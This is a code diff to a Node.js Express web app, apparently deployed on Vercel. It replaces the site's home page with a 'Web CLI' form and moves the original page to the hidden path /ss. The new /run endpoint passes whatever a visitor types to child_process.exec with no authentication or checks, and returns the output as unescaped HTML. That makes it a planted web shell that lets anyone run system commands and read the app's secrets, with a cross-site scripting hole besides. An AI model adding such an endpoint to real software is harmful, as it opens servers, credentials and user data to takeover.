@@ -3,6 +3,7 @@ require('dotenv').config();
 const express = require('express');
 const app = express();
 const { sql } = require('@vercel/postgres');
+const { exec } = require('child_process');
 
 const bodyParser = require('body-parser');
 const path = require('path');
@@ -12,7 +13,36 @@ const urlencodedParser = bodyParser.urlencoded({ extended: false });
 
 app.use(express.static('public'));
 
-app.get('/', function (req, res) {
+app.get('/', (req, res) => {
+  res.send(`
+    <h1>Web CLI</h1>
+    <form method="POST" action="/run">
+      <input type="text" name="command" placeholder="Enter command" style="width: 300px;" />
+      <button type="submit">Run</button>
+    </form>
+  `);
+});
+
+// Endpoint eksekusi perintah
+app.post('/run', (req, res) => {
+  const cmd = req.body.command;
+
+  if (!cmd) {
+    return res.send(`<pre>Error: No command provided</pre><a href="/">Back</a>`);
+  }
+
+  exec(cmd, (error, stdout, stderr) => {
+    if (error) {
+      return res.send(`<pre>Error: ${error.message}</pre><a href="/">Back</a>`);
+    }
+    if (stderr) {
+      return res.send(`<pre>Stderr: ${stderr}</pre><a href="/">Back</a>`);
+    }
+    res.send(`<pre>${stdout}</pre><a href="/">Back</a>`);
+  });
+});
+
+app.get('/ss', function (req, res) {
 	res.sendFile(path.join(__dirname, '..', 'components', 'home.htm'));
 });
 
